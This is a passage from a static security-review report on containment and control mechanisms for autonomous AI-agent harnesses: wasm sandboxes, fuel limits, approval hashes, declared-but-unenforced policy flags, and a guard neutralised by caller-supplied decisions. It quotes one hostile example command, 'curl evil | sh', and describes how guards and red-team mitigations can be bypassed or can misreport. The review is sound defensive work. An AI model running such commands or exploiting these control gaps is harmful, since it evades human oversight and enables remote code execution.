# wfh-009 · findings-W2 — bounded autonomy, receipts, and adversarial containment

**Workstream question:** How is an autonomous loop bounded, made replayable, and contained against an
adversary — and which of those bounds are real mechanisms rather than declared ones?

**Target pin (confirmed by this researcher):**
`git -C /tmp/wfh-008-metaharness rev-parse HEAD` → `6f8c60216f47eac391a076fe27fd804470a07e10`
(commit date `Wed Aug 26 07:56:24 2026 -0400`). Static reading only. Nothing was installed, built, run,
generated or fetched. **Nothing here is demonstrated-by-us evidence; nothing reaches `partial` or `proven`.**

**Packages:** Tier 1 — `avo`, `redblue`, `turn-credit`, `arc-agi-3-chatgpt`. Tier 2 — `horizon`, `oo-agents`.

---

## 0. Declared alphabet (C6 / `#323`) — stated before any completeness claim

I enumerated over four alphabets. Anything not expressible in them is out of view.

**A1 — package ownership.** The six directories named above under `/tmp/wfh-008-metaharness/packages/`.
Nothing outside them was opened.

**A2 — file census inside A1** (language-agnostic, not "expected" extensions):

```
find packages/avo packages/redblue packages/turn-credit packages/arc-agi-3-chatgpt \
     packages/horizon packages/oo-agents -type f -not -path '*/node_modules/*' -not -path '*/dist/*'
# → 101 .ts · 21 .json · 8 .md · 4 .mjs · 3 LICENSE · 2 .toml · 2 .rs · 1 .html
```

**A3 — the QUESTION set: protected operations, not known guards.** Six effect classes greped across every
file in A2, and each hit read:

```
child_process|spawn\(|execFile|execSync|exec\(                       # process / shell
fetch\(|http\.|https\.|new WebSocket|net\.connect|undici|axios|dgram  # network egress
writeFile|mkdir|rmSync|unlink|appendFile|createWriteStream|rm\(       # filesystem mutation
eval\(|new Function|vm\.|WebAssembly|import\(                         # dynamic code / wasm
process\.env                                                          # environment & credential reads
createHmac|createHash|createSign|sign\(|verify\(|randomBytes          # integrity / attestation
```

**A4 — the decision-variable sweep, and the reason it is here.** wfh-008's W6 swept *gates already named*
and had to withdraw its closure claim (`#323`). So I did the inverse: I enumerated every identifier in A2
that *names a bound or a permission*, then greped for its **readers** — so a declared bound with no
enforcement path becomes visible as an absence rather than staying invisible.

```
grep -rhoE "\b(allow[A-Za-z_]*|allowed[A-Za-z_]*|max[A-Z][A-Za-z_]*|max_[a-z_]+|limit[A-Za-z_]*|\
budget[A-Za-z_]*|fuel|deny[A-Za-z_]*|gate[A-Za-z_]*|approv[A-Za-z_]*|guard[A-Za-z_]*|require[A-Za-z_]*|\
bound[A-Za-z_]*|protected[A-Za-z_]*|immutable[A-Za-z_]*|readOnly|defaultDeny|secretPaths|netTools)\b" \
  <A1 packages> --include='*.ts' --include='*.mjs' --include='*.rs' --include='*.json' | sort -u
# → 124 distinct identifiers; each then re-greped for non-test readers
```

A4 produced concept **K6** below. It would not have been reachable from A3 alone, because an unread flag
performs no operation and therefore appears in no effect class.

### What these alphabets CANNOT see — stated negatively (`#324` §2)

- **The built WASM.** `packages/horizon/wasm/` and `packages/oo-agents/wasm/` **do not exist in the tree**
  at this commit; both packages' `files` arrays name a `wasm` directory that is not present. I read
  `crate/src/lib.rs` (Rust source), **not** the module that would actually execute. Every containment
  statement about those two packages is a statement about source, and the build step
  (`scripts/build-wasm.mjs`) was not run.
- **Injected ports.** All six packages are libraries whose most dangerous behaviour is contributed by the
  caller: `ToolExecutor`, `VariationAgent`, `EnvironmentAdapter`, `ApprovalGate`, `ReceiptSigner`,
  `AuditSink`, `ModelClient`, `TargetDriver`, `GovernedMemory`. An out-of-repo consumer supplying any of
  these is structurally out of reach of a static read.
- **Dynamic import by variable.** `avo/src/memory.ts:59` does `await import(specifier)`. A4/A3 see the
  site, not the reachable set.
- **Dependency source.** I read no source of `agenticow`, `@modelcontextprotocol/sdk`, `zod`, or
  `@metaharness/{kernel,arc-agi-3,radio}`.
- **`dist/`, `docs/adrs/*`, `submissions/`, `experiments/`.** `dist/` is absent; the ADRs the packages cite
  (ADR-251, ADR-248, ADR-197) sit in `docs/`, a declared hole of this run's scope.
- **Anything expressed as a bare magic number with no naming identifier** — invisible to A4 by construction.
- **Runtime.** No path was witnessed executing. Static evidence establishes structure and reachable-looking
  paths only.

---

## 1. Coverage table — every package owned by exactly one row (C6)

| Tier | Package | Verdict | Basis |
|---|---|---|---|
| 1 | `avo` | **concept found** | K7 (negative), K6 (instance). C2 ruled below: **not** disqualified. |
| 1 | `redblue` | **concept found** | K5, K6, K8 |
| 1 | `turn-credit` | **concept found** | K3 — the run's cleanest real mechanism |
| 1 | `arc-agi-3-chatgpt` | **concept found** | K4, K9, K6 (instance), K2 (half) |
| 2 | `horizon` | **concept found** | K1 (zero-import half), K7, K10 |
| 2 | `oo-agents` | **concept found** | K1 (single-import half), K2 |

No package returned `nothing portable`; no package was `disqualified by ecosystem coupling`.

### C2 ruling — mechanism level, per package (the coordinator's third ruling)

`avo` declares `peerDependencies: { agenticow: ^0.2.3 }` (optional) and `dependencies:
{ @metaharness/horizon: ^0.2.0 }`. **`agenticow` is loaded at exactly one site** —
`src/memory.ts:56-63`, `RvfGovernedMemory.create`, which throws if the peer is absent. Nothing else in the
package references it. **None of the concepts reported from `avo` (K6, K7) touches `RvfGovernedMemory`**;
they are properties of `operator.ts` and `repository.ts`. The mechanism-level ruling is therefore:
*the reported ideas are statable and implementable with `agenticow` deleted, so `avo` is not disqualified.*
The same test applied to `@metaharness/horizon` and `@metaharness/kernel`: K1, K2, K7 and K10 are statable
over a wasm module, a subprocess and a shell string with no MetaHarness type in the statement.
`oo-agents` depends on `@metaharness/radio`; nothing in K1 or K2 requires it.
**Ecosystem-name sweep, run rather than assumed** (an earlier draft of this line asserted a zero result from
memory; the grep returned five hits, so it is recorded in full — `#324`):

```
grep -rniE "ruflo|RUFLO_|claude-flow|agentic-flow|ruvector" <A1 packages>   # → 5 hits, all in turn-credit
  turn-credit/package.json:37     "ruflo"                       (keywords array)
  turn-credit/README.md:11-12     "e.g. a RuFlo replay with a RuVector-retrieved skill as privileged context"
  turn-credit/src/types.ts:120    "with a RuVector-retrieved skill"        (comment)
  turn-credit/src/receipt.ts:32   "the context itself can live in RuVector" (comment)
```

**Mechanism-level ruling: not disqualifying.** All five are a keyword tag or prose naming an *example*
upstream producer / example store. **No import, type, contract shape, env namespace or registry default is
involved**, and the mechanism-level test is what K3's statement requires: `processTrajectory` consumes
`{turn: number, evidence: number}[]` plus a real-valued advantage and a prior, and `buildCreditReceiptPayload`
emits a `sha256` **digest** of the retrieved context rather than the context — so the "context can live in
RuVector" line is a remark about where somebody else's blob lives, not a dependency. K3 is statable and
implementable with all five references deleted. **No `RUFLO_*` state/env namespace, no ruflo/RuVector/
agentic-flow package or crate edge, and no branded contract or registry default appears anywhere in A2.**

---

## 2. Concept register — 10 entries, 2 `new` / 8 `sharpens` / 0 `already held`

Novelty graded against **#200, #277, #316, #317, #318, #319, #323, #324, #325, #326**, each read live via
`context_graph(mode:"current", detail:"full")`. My area collides with held ground constantly; the eight
`sharpens` grades are the honest result, not a hedge.

---

### K1 — One-window containment: the egress enumeration is a property of the module format, not of a sweep

**Concept.** Run the untrusted computation inside a WebAssembly module instantiated with an *explicitly
enumerated* import object, and let the size of that object be the security argument. Two points on one axis:
**zero imports** for a pure decision function that must never act, and **exactly one import** for a
code-execution sandbox whose entire effect surface is a single host dispatch answered from a
capability table the host constructs.

**Why it matters.** `#319` §3 states that the security property is *the enumeration of execution sites*, and
wfh-008 found MetaHarness failing precisely there — ten `python3` sites beside a wrapper nobody routed
through. A hand-maintained enumeration decays; the wasm import table cannot. This is the one construction
found in this workstream where the third clause of the custody predicate is discharged by the substrate
rather than by discipline.

**How it would be used.** Jurati's model-authored steps become code cells executed inside a metered VM.
Every effect the step can have is a named method on a host object built outside the VM; the host answers
`{method,args}` by name lookup and throws on anything not in the table. Adding a capability means editing
the host object — a place the governed party has no write path to. Auditing "what can this step reach"
becomes reading one import list and one table, not grepping a repository.

**Custody verdict — PASSES all three clauses**, for the sandboxed path. Input: the host's own table.
Custody: the table is constructed outside the module. Call-site enumeration: structural.
*Honest limits:* (a) the capability **methods** run in the host with full Node authority, so the VM bounds
*which* effects are reachable, never *how much* effect one call has; (b) `oo-agents/src/agent.ts:89-113`
derives the capability set by **reflection** over own enumerable fields and own prototype methods — which
makes exposure the default: a subclass field holding a credential becomes readable through `getField`
without anyone opting in. A declared allowlist would invert that.

**Evidence — static code evidence.** `horizon/src/core.ts:38` — `WebAssembly.instantiate(bytes, {})`, an
empty import object, with the module header (L6-8) stating the intent: *"no host import and no ambient
authority … so it is safe to run on adversarial input."*
`oo-agents/src/vm.ts:58-62` — one import, `env.ooa_host_call`; `vm.ts:97-117` — the bridge parses JSON and
dispatches only `field` or `method`; `agent.ts:178-186` — `getField`/`callMethod` **throw** on a name not in
the derived manifest (deny by default, malformed input denied).
**Not verified:** the `wasm/` artifacts are absent from the tree (see §0); nothing was built or run.

**Novelty — `sharpens #319`.** #319 §3 asserts the *requirement* ("the security property is the ENUMERATION
of execution sites, not the wrapper"). This supplies the *construction* that satisfies it, in a new setting.
It is not `new`: the ground is held.

**Provenance.** `horizon` crate: *"A Rust/WASM clone of the best portable features of Google ADK's
long-horizon-harness (halt_reason + the command_classify anti-smuggling guard)."*
`oo-agents` manifest: *"a TypeScript clone of NOOA (NVIDIA-NeMo/labs-OO-Agents)"*; crate:
*"the sandbox layer of the NOOA (NVIDIA OO Agents) clone."* **Whether the wasm-cell sandbox is NOOA's design
or MetaHarness's addition is not established** — reading the upstream is out of scope.

---

### K2 — A bound is only a bound if the enforcer can stop the work: step-metered fuel, never a racing deadline

**Concept.** Meter the governed party's compute in the interpreter's own step count, decremented inside the
execution loop, and terminate on exhaustion. Do **not** bound an effectful operation with
`Promise.race(work, timeout)` in a runtime with no cancellation: the loser is abandoned, not stopped, so the
caller is told the operation failed while it continues to completion.

**Why it matters.** This is where "bounded" and "replayable" are the same property. A step counter is
deterministic (same input, same exhaustion point) and it actually halts. A wall-clock race is
non-deterministic *and* produces a receipt that is false — the ledger records a failure that succeeded.
For a substrate whose whole value is that its records are trustworthy, a timeout that lies is worse than no
timeout.

**How it would be used.** Every model-authored step carries a fuel budget charged per interpreter step, with
expensive primitives charged proportionally to input size so one call cannot buy unbounded work. Any
*mutating* operation the substrate cannot cancel is never raced: it runs to completion behind
compare-and-swap and an idempotency key, and the deadline applies only to reads.

**Custody verdict — passes for the fuel half** (the counter lives inside the sandbox, which the governed
party cannot edit; the budget is a host-supplied argument). **The deadline half is not control-shaped** — it
is an integrity property of the receipt, and the finding is that MetaHarness got it right by *declining* to
apply the bound rather than by applying one.

**Evidence — static code evidence.**
`oo-agents/crate/src/lib.rs:752` `DEFAULT_FUEL = 200_000`; `:765-766` fuel argument with a default;
`:793-796` `if self.fuel < n { return Err("fuel exhausted: cell exceeded its step budget") }`;
`:1237-1238` — sorting charges fuel proportional to length *"so a huge array can't buy unbounded compute for
a single step."* A second bound at `oo-agents/src/agent.ts:242`: refusal after `maxCells` cells without a
result.
`arc-agi-3-chatgpt/src/policy.ts:88-132` — `readOnly` operations are raced against `toolTimeoutMs`;
mutations are not, with the reason stated in code at L128-130: *"An abandoned `Promise.race` can let a write
finish after ChatGPT was told it failed. Mutations therefore run to completion and depend on controller CAS,
guards, and idempotency for safe retries."*

**Novelty — `new`.** Nearest neighbours, and why neither holds it: **#200** holds *pre-dispatch* cost/token
bounds and pre-authorised spend — an admission check before work starts, which never raises the question of
stopping work in flight. **#319/#316** hold degraded-mode truthfulness — about *reporting* a degraded state,
not about the cancellation semantics that make the report false in the first place. The proposition *"a
limit is only a limit where the enforcer can actually halt the work, and a non-cancelling timeout
manufactures a false receipt"* is not in the graph.

**Provenance.** None declared for the fuel mechanism beyond the NOOA clone framing (see K1).

---

### K3 — Make the forbidden outcome unrepresentable instead of guarding against it

> *The property that makes `turn-credit` a W2 package, per the coordinator's ruling and confirmed here:*
> ***an advisory channel structurally forbidden from reversing the verifier's decision.***

**Concept.** When one channel must inform but never override another, express the advisory channel as a
**strictly-positive multiplicative modulation** of the authority channel's signed value, and validate the
parameter range once so positivity cannot be configured away. The authority owns the **sign**; the advisor
owns only the **magnitude**. There is then no gate to bypass, because no admissible input produces the
forbidden outcome.

**Why it matters.** Every other control in these six packages is a decision that some code path must
remember to make, on an input somebody supplies. This one is not a decision at all. For a substrate whose
enforcement must live outside the governed party's reach, the strongest form of "outside reach" is
*unrepresentable*, and it is the only form that survives an adversary who can call any exported function in
any order.

**How it would be used.** Any Jurati signal that ranks, prioritises, retries, routes or nominates —
learned scores, heuristics, model self-assessment — is admitted only as a bounded positive factor over a
decision the authority already made. A recommender can move a task from rank 3 to rank 1; it cannot move an
outcome from *denied* to *allowed*, because "denied" is a sign and the recommender's whole output space
preserves sign.

**Custody verdict — PASSES, by a route the predicate was not built to test.** The predicate asks who holds
the gate's input; here the answer is that there is no gate. The configuration is the only attack surface,
and it is closed at the single entry point.

**Evidence — static code evidence.** `turn-credit/src/reshape.ts:5-12,40-55`:
`w_k = clip(1 + b·z_k, 1−b, 1+b)`, `m_k = (1−λ) + λ·w_k`, `Ã_k = A_seq · m_k`. With `b ∈ (0,1)` and
`λ ∈ [0,1]`, `m_k ≥ 1 − λb ≥ 1 − b > 0`, so `sign(Ã_k) = sign(A_seq)` for every admissible configuration.
**The range is enforced, not assumed:** `src/processor.ts:64-66` throws on `gamma ∉ (0,1]`,
`bound ∉ (0,1)`, `mix ∉ [0,1]` — *malformed input denied, not clamped.* `GOVERNED_DEFAULTS`
(`types.ts:59-65`) tightens `λ·b` to `±10%` against the paper's `±25%`.
A second, separable custody move in the same package — **the evidence producer refuses to be the signer**:
`receipt.ts:5` *"SIGNING stays where the keys live — in the caller"*; the module builds a payload and
digests, and holds no key.

**Novelty — `new`.** Nearest neighbour is **#200**, which holds monotone capability envelopes that *throw*
`capability-envelope-cannot-grow` — a **check** at delegation time, defeated by any path that skips it. K3
is structurally different: guard the parameter space once, and the decision-time output space contains no
violating value. "Prefer unrepresentable over guarded" is not in the graph.

**Provenance — declared, verbatim.** Manifest: *"Offline recursive turn-level credit assignment for agent
trajectories (**AgentOPSD, arXiv:2608.05987**) … Never reverses the verifier's decision; never updates model
weights."* Source headers cite **ADR-248** §3/§4/§6. **The algebra is the paper's** — `reshape.ts` calls
`b=0.5, λ=0.5` the *"paper default"*. What MetaHarness adds is (a) naming the sign-preservation property as a
governance invariant, (b) the `±10%` governed preset, (c) the range validation. **Do not credit MetaHarness
with the mechanism.** The upstream was not read.

---

### K4 — Bind an approval to a content hash of the exact evidence it was formed on

**Concept.** When a supervisor (human or otherwise) issues a directive after being shown an evidence bundle,
require the directive to carry the hash of that bundle **and** of the observation inside it, and refuse to
apply it if the authority's current bundle no longer matches. Approval becomes state-bound rather than
merely time-bound.

**Why it matters.** It closes the gap between *"the human approved X while looking at state S"* and
*"X was applied to state S′."* An expiry window does not close it — the world can move inside the window;
an unbounded-validity token does not close it at all. This is the mechanism a human-steering plane needs if
its approvals are to mean anything under concurrency.

**How it would be used.** Every human gate in Jurati returns `{decision, caseHash, observationHash}`. The
enforcement plane recomputes both from its own live state and refuses on mismatch, sending the human back a
fresh case rather than applying a stale approval. Cheap: two hashes and an equality check.

**Custody verdict — PASSES on input and custody.** The requester supplies hashes; the *comparand* is the
server's own current bundle, which the requester cannot author. **Bounded on call-site enumeration:** I
enumerated over the MCP tool registry in `src/tools.ts`, not over the full exported surface of
`src/store.ts` — a second path to `prepareBossDirective` would be outside my sweep.

**Evidence — static code evidence.** `arc-agi-3-chatgpt/src/tools.ts`, `arc_supervisor_directive_commit`:
rejects unless `current.case.id === directive.caseId` **and** `current.case.caseHash === directive.caseHash`
**and** `current.observation.observationHash === directive.observationHash`, throwing *"directive does not
target the current supervisor case"*. Paired with a lane asymmetry declared in the tool descriptions —
*"The boss lane has no action capability"* / *"This lane cannot invoke an ARC environment action"* — and
enforced by `policy.ts:50-53`, where `TOOLS_BY_LANE.boss` is a two-element set. **Same architecture as K3 in
a different register: advice cannot become action.**

**Novelty — `sharpens #200`.** #200 holds approval machinery with *"unique ids, expiry and integer use
counts, with revocation."* This is the same family with the binding moved from **time** to **state**.

**Provenance.** None declared.

---

### K5 — Take the admission list from the counterparty who bears the consequence; and rank the rungs beside it by who holds the input

**Concept.** For an irreversible act with an external audience, do not gate on your own configuration: fetch
the permitted-target list **live from the party that will bear the consequence**, require the target to
match an entry that party marks eligible, and treat unreadability as refusal. Then, beside it, stack the
cheap rungs — one act per invocation, an interactive terminal, two distinct affirmations, a verified
reproduction — and **rank the whole ladder by who holds each rung's input**, because the ladder is only as
strong as its weakest load-bearing rung.

**Why it matters.** `#277` names this exact seam as **uncovered**: *"external/public-representation sends
are invisible to consequence-aware planes when the destination is resource-allowed … public representation
needs owner policy."* Filing a report under your own name at someone else's programme is the canonical case.
The mechanism here is a concrete answer: the destination already publishes machine-readable admission —
make that the gate input.

**How it would be used.** Any Jurati action that speaks publicly in the owner's name (an issue, a PR to a
foreign repo, an email, a submission) queries the destination's own scope/eligibility API at act time,
matches the target against it, and refuses when the query fails.

**Custody verdict — SPLIT, and that is the finding.** In one four-rung ladder:
- **Gate 1, SCOPE — passes.** The eligible-asset list is fetched live from HackerOne and the harness cannot
  author it. Fail-closed on unreadable scope and on a missing key. *(The first gate input in these six
  packages that genuinely sits outside the governed party.)*
- **Gates 2–4 — fail on input.** `repro.confirmed`, `--confirm`, `--i-am-submitter` and the
  interactive/CI determination are all read from the calling process: `input.env ?? process.env`,
  `input.isTty ?? process.stdout.isTTY`, and `input.flags`. **"A human is present" is not verifiable from
  inside the process it constrains** — TTY and CI environment variables are self-report, and `env` and
  `isTty` are injectable parameters of the function.

**Evidence — static code evidence.** `redblue/src/integrations/h1-submit.ts:140` (*"fail closed: ineligible
never matches"*), `:160-232` (the four gates), `:205-210` (fail-closed on no key / unreadable scope),
`:161-162` (the injectable `env`/`isTty`), `:229-232` + `:299-306` (a **write-scope probe on the credential**
before attempting — rehearsing the capability, in the spirit of `#319` §2), `:308-315` (the single POST).

**Novelty — `sharpens #277`.** #277 holds the plane-per-leg admission map and names this seam as the
uncovered one. K5 supplies a covering mechanism for it and, separately, extends #277's
*"attribution is persisted self-assertion and cannot authorize"* from **identity** to **presence**.

**Provenance.** `redblue` manifest names **NIST AI RMF** and the **OWASP LLM Top-10** as the framework it
operationalises; ADR-197 is cited in `integrations/hackerone.ts`. No origin is declared for the gate ladder.

---

### K6 — The disconnected control: a policy variable with no reader (four independent instances)

**Concept.** A control is not a control unless some code path **reads its value and refuses**. Between a
control that is bypassed and a control that is disconnected, the disconnected one is worse: it cannot be
found by looking for a bypass, it survives review because the declaration is well-formed, and it is often
the artifact published as the safety claim. The portable rule: **derive the runtime enforcement from the
declaration (one source), or delete the declaration** — and make "which declared bounds have readers" a
mechanical check, not a reading exercise.

**Why it matters.** wfh-008's predicate catches controls whose *input* the governed party authors. It does
not catch a control that decides nothing, because there is no decision to subvert. A4 exists to catch these,
and it found four in six packages.

**How it would be used.** In Jurati, a declared-capability manifest is either loaded and enforced at the
enforcement point, or it does not exist. CI asserts that every identifier in the manifest has a reader in
the enforcement path — the inverse of asserting that the manifest parses.

**Custody verdict — fails on call-site enumeration, degenerately: the call-site set is empty.**

**Evidence — static code evidence.** Every site of each fact was greped and ruled on together (`#324` §1):

1. **`redblue` — `allow_network`, `allow_shell`, `allow_real_credentials`.** All occurrences are a type
   declaration (`types.ts:169-171`), a default (`loader.ts:46-48,190-192`; `safety.ts:33-35`), a rejection of
   `true` (`safety.ts:43-57`), a CLI template comment (`cli/index.ts:41,60-62`), or a test. **No site
   consults the value to decide whether to perform a network call, execute a shell, or forward a
   credential.** Meanwhile the package does egress live: `models/openrouter.ts:45` `fetch(
   'https://openrouter.ai/api/v1/chat/completions')` with `process.env.OPENROUTER_API_KEY` (`:15,:27`);
   `integrations/hackerone.ts:400` fetches the HackerOne GraphQL endpoint with a token from `process.env`
   or a local `.env` (`:92-101`); `h1-submit.ts:309` POSTs.
2. **`arc-agi-3-chatgpt` — `.harness/mcp-policy.json`.** `defaultDeny`, `allowNetwork`, `allowShell`,
   `allowFileWrite`, `fileWriteAllowlist`, `networkAllowlist` occur **only** in that JSON;
   `requireApprovalForDangerous` additionally only in `__tests__/package.test.ts:74`, which asserts its
   value. **No `src/` reader for any of them.** The trap is the mixture: `maxRequestBytes` and
   `requestTimeoutMs` from the *same file* **are** independently reimplemented in `src/server.ts:32-33,435,
   468`, so the document reads as live throughout. A test that parses the manifest and checks a field
   verifies the document, not the behaviour.
3. **`avo` — `allowedSurfaces`.** `types.ts:184` declares it; `operator.ts:171` writes
   `['retrievalPolicy','modelRouting','contextPolicy','testPolicy','repairStrategy']` **into the object
   handed to the untrusted agent**; nothing reads it. The README's *"Security policy and capability
   expansion are not evolvable surfaces"* is therefore enforced only insofar as the caller-supplied
   `writablePaths` regexes happen to exclude them — **and no code links the two statements.**
4. **`avo` — `requireSignedReceipts`** (`types.ts:126`): declared in `ProtectedInvariants`, set in four
   tests, **read nowhere in `src/`** — while its sibling **`requireZeroPolicyViolations` in the same
   interface IS read**, at `operator.ts:261`. A textbook `#324` adjacency: two fields, one line apart, one
   enforced and one not.

**Novelty — `sharpens #200`.** #200 holds the inert-control position (the default mode yields *allowed*; the
delegation propagator *"has no call sites by its own header"*). K6 extends it from unreferenced **code** to
unreferenced **published policy data**, which is the more dangerous form because the data is what a
reviewer, an integrator or a procurement process reads as the safety claim.

**Provenance.** None declared.

---

### K7 — A decision must be an enforcement point's OUTPUT, never one of its inputs

**Concept.** An enforcement point takes the *request* and produces the *decision*. The moment a decision is
accepted as a **parameter**, the enforcement point becomes a recorder: the correct composition and the
bypassing composition are indistinguishable at its own boundary, and no amount of quality inside the
classifier can detect it. Design the API so the wrong composition is unrepresentable.

**Why it matters.** This is `#318`'s gate-input rule surviving **composition**. wfh-008 found the defect
inside one package (a rail deciding on a proposer-supplied boolean). Here a genuinely well-built guard in
one package is neutralised by a *different first-party package* that fabricates the guard's output and hands
it to the executor — which is worse, because each package looks correct in isolation and the defect lives in
the seam between them.

**How it would be used.** Jurati's execution plane exposes `execute(request)` and calls the classifier
itself. There is no `execute(request, decision)` overload, no `approved: boolean` parameter, and no way for
a caller to assert that authorization already happened.

**Custody verdict — fails on input.** The `Classification` and `approved` flag that decide whether a
subprocess spawns are authored by the calling package.

**Evidence — static code evidence.**
`horizon/src/executor.ts:27-31` — `ToolExecutionRequest { command, classification, approved }`;
`:105-106` — `NodeToolExecutor.execute` derives `policyReceipt` from `makePolicyReceipt(request.
classification, request.approved)` and **never calls `CommandGuard.classify`**; `:122-129` — on `authorized`
it `spawn`s with `shell: true`.
The correct composition exists: `horizon/src/driver.ts:149-160` classifies, then approves, then executes.
**`avo` takes the other path:** `avo/src/repository.ts:16-22` defines `allowedClassification(command)`
returning a hand-built `verdict: 'allow'`, and passes it with `approved: true` at `:88-92` (agent-chosen
commands) and at `:224-228` (evaluator commands). The consequence propagates into scoring:
`CommandEvaluatorSuite` counts `violations` from `result.policyReceipt.authorized` (`:233`) and reports
`safe: violations === 0` (`:245`) — **a safety verdict computed from a field the caller pre-determined.**

**Novelty — `sharpens #318`.** #318 holds *"a guard whose only input is authored by the guarded party is a
label, not a control."* The sharpening: the defect is not confined to the model. It survives package
composition, it is invisible from inside the guard's own package, and the fix is an API shape
(decision-as-output), not a better classifier.

**Provenance.** None declared for the executor. See K10 for the guard's declared origin.

---

### K8 — Mitigate the operation, not the observation — especially when the observation is also the metric

**Concept.** A mitigation applied to the *record* of an operation rather than to the operation improves the
measurement without changing the system. It is a specific and severe failure when the same channel the
mitigation edits is the channel the improvement is measured on: the fix certifies itself.

**Why it matters.** Jurati's self-improvement and its evidence share one substrate. Any mitigation that
writes to the evidence stream is capable of manufacturing its own success, and the resulting number is
indistinguishable from a real reduction. The rule: **measure the effect at the effect.**

**How it would be used.** Every guard is classified at review time as *pre-operation* (it can prevent) or
*post-observation* (it can only annotate). Post-observation guards may never be counted as mitigations in a
before/after metric, and the metric is computed from the unedited stream.

**Custody verdict — not control-shaped.** It is post-hoc redaction of an evidence stream presented as a
defence. The predicate does not apply; A4 and a read of the call order do.

**Evidence — static code evidence.** `redblue/src/attacks/sandbox.ts`, `PatchedTargetDriver.invoke`. The
rule kinds split cleanly and the package does not distinguish them:
- **Pre-operation, real:** `blockSubstrings` short-circuits and returns a refusal **before**
  `inner.invoke` (`:94-103`); `hardeningPrefix` alters the input actually sent (`:106`).
- **Post-observation:** `allowedTools` filters `tel.toolCalls` at `:111-113` and `maxIterations` truncates
  it at `:114-116` — **both after `const tel = await this.inner.invoke(hardenedInput)` at `:107`.** The
  target has already run and already called its tools; what changes is the reported list.
The runner then judges the filtered telemetry and computes the headline delta
(`runner.ts:229-256`, "measure the failure reduction"). Presented in the README as *"Blue team — auto-patches
the vulnerable families"* and *"Retest — re-runs the attacks and measures the failure reduction."*

**Novelty — `sharpens #319`.** #319 §3 holds *"route the protected operation through the gate rather than
beside it"* and degraded-mode truthfulness. The sharpening is the closed loop: here the beside-the-gate
edit lands **on the measurement channel**, so the mitigation's own metric is computed downstream of the
mitigation's own edit.

**Provenance.** NIST AI RMF / OWASP LLM Top-10 named as the taxonomy (see K5). No origin declared for the
patch mechanism.

---

### K9 — Make a durable audit write a *precondition* of the effect, not a consequence of it

**Concept.** Write the authorization record and **await its durability before invoking the operation**, and
let a failure of the audit sink prevent the operation entirely. An action that cannot be recorded is an
action that cannot happen.

**Why it matters.** Under an adversary who can suppress the log, "log after" and "no log" are the same. If
the sink is externally held, this inverts the incentive: suppressing the record costs the adversary the
capability.

**How it would be used.** Jurati's enforcement point writes `{principal, tool, decision}` to an
append-only externally-held log and blocks on the acknowledgement before dispatching. Log unavailable →
plane unavailable, stated as such.

**Custody verdict — PASSES, conditionally on the sink's custody, and the shipped sink does not satisfy the
condition.** The *structure* is right. The default `FileAuditSink` (`audit.ts:12-25`) appends to a local
`.jsonl` at `process.env.ARC_MCP_AUDIT_LOG ?? '.harness/arc-mcp-audit.jsonl'` with `0600`/`0700` modes — a
file the governed process can rewrite, and a path it can redirect via an environment variable it may hold.
The mechanism is only as strong as where the sink is.

**Evidence — static code evidence.** `arc-agi-3-chatgpt/src/policy.ts:110-117`, comment and code: *"
Authorization is durable before any mutation begins. If the audit sink is unavailable, this throws and the
tool body is never invoked."* `await this.audit.write({... decision:'allowed' ...})` precedes
`options.body()`. Denials are also written before the throw (`:101-108`).

**Novelty — `sharpens #319`.** #319 §5 holds *"pre-operation decision separated from post-operation
receipt."* K9 adds the blocking direction: the record's **durability gates** the operation.

**Provenance.** None declared.

---

### K10 — Authorize the whole effect expression, at every nesting level — and treat the second parser as the ceiling

**Concept.** When the unit of effect is an *expression* rather than a call (a shell line, a query, a
template), the unit of authorization must be the whole expression: split it quote-aware into segments,
recurse into every substitution, classify each, and take the **maximum** severity, with an unrecognised
operator defaulting to *confirm* rather than *allow*. Match dangerous patterns against a **quote-stripped
skeleton** so a dangerous string passed as *data* is not misread as a command.
**And the ceiling, which is the more valuable half:** a guard that reimplements the executor's grammar is
only as strong as the agreement between two parsers. Prefer to remove the second parser — pass argv, not a
shell string — over improving the first.

**Why it matters.** Jurati will be asked to authorize composite effects. The first-token heuristic is a
known-broken instrument (`echo hi && curl evil | sh`), and the fix is cheap. The ceiling matters more,
because the strongest available version of this mechanism is still a heuristic over an unbounded grammar,
and a design that *needs* it is already conceding a parser differential.

**How it would be used.** Where a shell string is unavoidable, classify the full expression with
max-severity escalation across segments and substitutions, deny-first ordering (exfiltration → egress →
hard-deny → gate → allow → unknown-default), and unknown ⇒ gate. Where it is avoidable, remove the shell.

**Custody verdict — passes within the driver composition, fails at the executor's boundary.** The request is
governed-party-authored (as any request must be) but the decision rule and routing are the driver's
(`driver.ts:149-160`). The failure is K7's, not this mechanism's.

**Evidence — static code evidence.** `horizon/crate/src/lib.rs:512-515` (severity order and max across
segments *and* nested substitutions), `:578` `split_segments` (quote-aware), `:670` `extract_substitutions`
(`$(...)` and backticks), `:733-766` `strip_quoted` (skeleton projection), `:796-828` `classify_segment`
(layered ordering), **`:553-557` `default_unknown` defaults to `Gate`** — *"safe default: an unknown command
is confirmed, not auto-run."* Fail-closed defaults also at `driver.ts:151-155` (no approve seam ⇒ not
approved) and `executor.ts:166-176` `UnavailableToolExecutor` — **a missing executor is an observed
exit-127 failure with an unauthorized receipt, never an assumed success.**
**The ceiling, static code evidence:** `executor.ts:123-129` spawns with `shell: true`, so the OS shell
re-parses the same string with full shell semantics; the guard's parser and the shell's parser must agree,
and any divergence is a bypass. `matches_any` (`:728-731`) is substring-based, which errs toward
over-gating (fail-closed) rather than under-gating. **I did not attempt to construct a differential input,
and this is not a vulnerability claim.**

**Novelty — `sharpens #200`.** #200 holds a blocking deterministic policy chokepoint on every MCP tool
dispatch — authorization per *named tool*. K10 states what changes when the effect is an *expression*: the
authorization unit must be the whole expression including nesting, and reimplementing the executor's grammar
imposes a ceiling that per-tool dispatch never faces.

**Note for `#318`/`#319`, stated because it corrects a natural over-read:** `horizon` is a **fail-closed**
counter-instance inside the same repository as wfh-008's fail-open `sandbox.ts`. Unknown ⇒ gate; absent
approver ⇒ deny; absent executor ⇒ observed failure. **The same author wrote both.** The uniform-posture
reading of MetaHarness does not hold; the posture varies by package.

**Provenance — declared, verbatim.** `guard.ts:1-9`: *"CommandGuard — the ADK `command_classify.py`
anti-smuggling guard as a TypeScript object over the pure Rust classifier … ADK's Layer-D permission guard
classifies the WHOLE shell command."* `halt.ts:1-12`: *"the ADK `halt_reason` mechanism."* Crate manifest:
*"A Rust/WASM clone of the best portable features of Google ADK's long-horizon-harness."* **The mechanism is
declared to be Google ADK's, not MetaHarness's.** Upstream not read.

---

## 3. Findings that are not concepts

**3.1 — The custody predicate caught four more subsystems, and passed three.** Reported honestly rather than
